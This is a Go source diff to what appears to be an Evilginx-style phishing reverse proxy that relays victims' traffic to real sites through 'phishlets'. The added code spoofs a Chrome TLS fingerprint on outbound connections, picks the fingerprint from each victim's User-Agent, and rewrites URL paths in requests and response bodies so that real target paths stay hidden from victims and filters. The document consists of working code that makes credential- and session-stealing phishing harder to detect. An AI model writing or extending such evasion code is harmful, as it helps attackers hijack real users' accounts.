@@ -10,6 +10,7 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"context"
 	cryptorand "crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -85,6 +86,7 @@ type HttpProxy struct {
 	polymorphicEngine *PolymorphicEngine
 	obfuscator        *JSObfuscator
 	sessionFormatter  *SessionFormatter
+	utlsTransport     *UTLSTransport
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -145,6 +147,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		polymorphicEngine: nil, // Will be initialized based on config
 		obfuscator:        NewJSObfuscator(cfg),
 		sessionFormatter:  NewSessionFormatter(),
+		utlsTransport:     NewUTLSTransport(FingerprintChrome, true), // Enable Chrome TLS fingerprint by default
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -202,6 +205,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.tlsInterceptor = NewTLSInterceptor(p.ja3Fingerprinter)
 	log.Info("JA3/JA3S TLS fingerprinting enabled with %d known bot signatures", p.ja3Fingerprinter.GetKnownBotCount())
 
+	// Configure goproxy to use uTLS transport for outbound connections
+	// This spoofs the TLS fingerprint to look like a real browser
+	if p.utlsTransport != nil && p.utlsTransport.IsEnabled() {
+		p.Proxy.Tr = p.utlsTransport.GetTransport()
+		log.Info("uTLS enabled with %s fingerprint for outbound connections", p.utlsTransport.GetFingerprintName())
+	}
+
 	// Initialize domain rotation if enabled
 	if cfg.GetDomainRotationConfig() != nil && cfg.GetDomainRotationConfig().Enabled {
 		p.domainRotation = NewDomainRotationManager(cfg.GetDomainRotationConfig(), p.crt_db)
@@ -258,6 +268,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+
+			// Detect TLS fingerprint from User-Agent and inject into context
+			if p.utlsTransport != nil && p.utlsTransport.IsEnabled() {
+				ua := req.Header.Get("User-Agent")
+				fp := DetermineFingerprint(ua)
+				// Create new context with fingerprint
+				// Note: req.Clone(ctx) or req.WithContext(ctx) is needed
+				c := context.WithValue(req.Context(), FingerprintContextKey, fp)
+				req = req.WithContext(c)
+				log.Debug("assigned TLS fingerprint: %s (UA: %s)", fp, ua)
+			}
 
 			// -------------------------------------------------------------------------
 			// REFACTORED: Chain of Responsibility (Middleware)
@@ -383,6 +404,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
+			if pl != nil && len(pl.pathRewrite) > 0 {
+				for _, pr := range pl.pathRewrite {
+					if req.URL.Path == pr.Trigger {
+						log.Debug("path rewrite: %s -> %s", req.URL.Path, pr.Target)
+						req.URL.Path = pr.Target
+						break
+					}
+				}
+			}
 			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
@@ -1897,6 +1927,20 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			}
 			return s_url
 		}))
+	}
+
+	// Path rewriting (Egress/Ingress Body)
+	if pl.pathRewrite != nil {
+		for _, pr := range pl.pathRewrite {
+			if c_type == CONVERT_TO_PHISHING_URLS {
+				// Server -> Victim: Rewrite Real Path (Target) -> Safe Path (Trigger)
+				body = bytes.ReplaceAll(body, []byte(pr.Target), []byte(pr.Trigger))
+			} else {
+				// Victim -> Server: Rewrite Safe Path (Trigger) -> Real Path (Target)
+				// This is for POST bodies (JSON/Form) coming from victim
+				body = bytes.ReplaceAll(body, []byte(pr.Trigger), []byte(pr.Target))
+			}
+		}
 	}
 	return body
 }
